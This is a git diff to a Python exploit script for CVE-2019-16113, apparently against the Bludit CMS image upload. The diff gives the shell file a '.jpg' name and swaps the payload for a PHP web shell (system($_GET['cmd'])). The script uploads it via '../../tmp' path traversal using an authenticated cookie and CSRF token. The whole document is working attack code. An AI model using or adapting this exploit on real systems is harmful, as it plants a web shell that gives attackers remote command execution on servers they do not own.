@@ -34,7 +34,7 @@ class CVE2019_16113():
             "Accept-Language" : "q=0.8,en-US;q=0.5,en;q=0.3",
             "Accept-Encoding" : "gzip, deflate"
         }
-        self.webshell = self.rnd()
+        self.webshell = self.rnd() + ".jpg"
 
     # get random string
     def rnd(self):
@@ -78,7 +78,7 @@ class CVE2019_16113():
     def upload_shell(self, la_cookie, token):
         print (LogColors.BLUE + "upload shell..." + LogColors.ENDC)
         data = {"uuid" : "../../tmp", "tokenCSRF" : token}
-        data_files = [('images[]', (self.webshell, "<?php shell_exec(\"rm .htaccess; rm " + self.webshell + ";" + self.cmd + "\");?>", 'application/octet-stream'))]
+        data_files = [('images[]', (self.webshell, "<?php system($_GET['cmd']); ?>", 'application/octet-stream'))]
         cookies = {"BLUDIT-KEY" : la_cookie}
         r = self.session.post(
             self.url + '/admin/ajax/upload-images',
